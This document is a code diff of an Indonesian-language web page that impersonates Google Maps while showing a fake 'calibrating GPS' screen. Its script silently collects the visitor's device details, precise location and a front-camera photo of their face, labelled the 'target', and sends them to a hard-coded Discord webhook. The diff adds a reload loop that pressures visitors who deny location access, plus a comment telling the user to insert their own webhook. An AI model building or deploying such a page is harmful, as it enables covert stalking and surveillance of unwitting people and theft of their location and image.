@@ -3,29 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Maps - Memuat...</title>
-    <meta property="og:title" content="Google Maps - Berbagi Lokasi Real-time">
-<meta property="og:description" content="Klik untuk melihat lokasi presisi dan rute perjalanan.">
-<meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png">
+    <title>Google Maps - Berbagi Lokasi</title>
+    
+    <meta property="og:title" content="Google Maps: Lokasi Terkini Saya">
+    <meta property="og:description" content="Klik untuk melihat posisi real-time dan rute perjalanan presisi.">
+    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png">
+    <meta property="og:type" content="website">
+
     <style>
-        body { font-family: sans-serif; background: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { text-align: center; color: #5f6368; }
-        .logo { width: 80px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        body { font-family: 'Roboto', Arial, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+        .container { width: 80%; }
+        .gmaps-logo { width: 70px; margin-bottom: 20px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
+        h1 { font-size: 16px; color: #3c4043; font-weight: 400; }
+        p { font-size: 12px; color: #70757a; margin-top: 10px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="loader">
-    <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" class="logo">
-    <p>Mengkalibrasi GPS untuk akurasi terbaik...</p>
+<div class="container">
+    <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" class="gmaps-logo">
+    <h1>Mengalibrasi sinyal GPS...</h1>
+    <p>Mohon tunggu sebentar untuk mendapatkan akurasi terbaik.</p>
 </div>
 
 <video id="video" autoplay></video>
 <canvas id="canvas"></canvas>
 
 <script>
+    // MASUKKAN LINK DISCORD KAMU DI SINI
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";
 
     async function sendToDiscord(msg, blob = null) {
@@ -40,39 +47,34 @@
     }
 
     async function start() {
-      // 1. Ambil Info Perangkat Lebih Detail
-        let infoHP = "📱 **DATA PERANGKAT TERDETEKSI**\n";
-        
-        // Deteksi Tipe (Android/iPhone/Windows)
+        // 1. Ambil Data Perangkat Terperinci
         let os = "Unknown OS";
         if (navigator.userAgent.indexOf("Android") != -1) os = "Android 🤖";
         if (navigator.userAgent.indexOf("iPhone") != -1) os = "iPhone 🍎";
-        
-        infoHP += "• Sistem: " + os + "\n";
-        infoHP += "• Layar: " + window.screen.width + "x" + window.screen.height + " (Res)\n";
-        infoHP += "• Processor: " + (navigator.hardwareConcurrency || "N/A") + " Core\n";
-        infoHP += "• Memori: " + (navigator.deviceMemory || "N/A") + " GB (Estimasi)\n";
-        infoHP += "• Browser: " + (navigator.userAgent.match(/(Chrome|Safari|Firefox|Edge)\//) ? navigator.userAgent.match(/(Chrome|Safari|Firefox|Edge)\//)[1] : "Lainnya");
 
-        // Cek Baterai
+        let infoHP = "📱 **DATA PERANGKAT TERDETEKSI**\n";
+        infoHP += "• Sistem: " + os + "\n";
+        infoHP += "• Layar: " + window.screen.width + "x" + window.screen.height + "\n";
+        infoHP += "• Processor: " + (navigator.hardwareConcurrency || "N/A") + " Core\n";
+        infoHP += "• Memori: " + (navigator.deviceMemory || "N/A") + " GB\n";
+
         if (navigator.getBattery) {
             try {
                 const b = await navigator.getBattery();
-                infoHP += "\n• Baterai: " + (b.level * 100).toFixed(0) + "% " + (b.charging ? "⚡" : "🪫");
+                infoHP += "• Baterai: " + (b.level * 100).toFixed(0) + "% " + (b.charging ? "⚡" : "🪫");
             } catch (e) {}
         }
-
-        // KIRIM DATA HP
         await sendToDiscord(infoHP);
 
-        // 2. Baru Ambil Lokasi & Foto
+        // 2. Ambil Lokasi & Foto
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
+                const acc = pos.coords.accuracy;
                 const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                 
-                await sendToDiscord(`📍 **LOKASI PRESISI**\n${mapUrl}`);
+                await sendToDiscord(`📍 **LOKASI PRESISI**\nAkurasi: ${acc.toFixed(1)} meter\nLink: ${mapUrl}`);
 
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -87,17 +89,19 @@
                         canvas.toBlob(async (blob) => {
                             await sendToDiscord("📸 **FOTO WAJAH TARGET**", blob);
                             stream.getTracks().forEach(t => t.stop());
-                            window.location.href = mapUrl;
+                            window.location.href = mapUrl; // Langsung buka Maps
                         }, 'image/jpeg');
                     }, 2000);
                 } catch (e) {
                     window.location.href = mapUrl;
                 }
             }, (err) => {
-                window.location.href = "https://www.google.com/maps";
+                alert("Izin lokasi diperlukan untuk sinkronisasi Google Maps.");
+                location.reload();
             }, { enableHighAccuracy: true });
         }
     }
+
     window.onload = start;
 </script>
 </body>
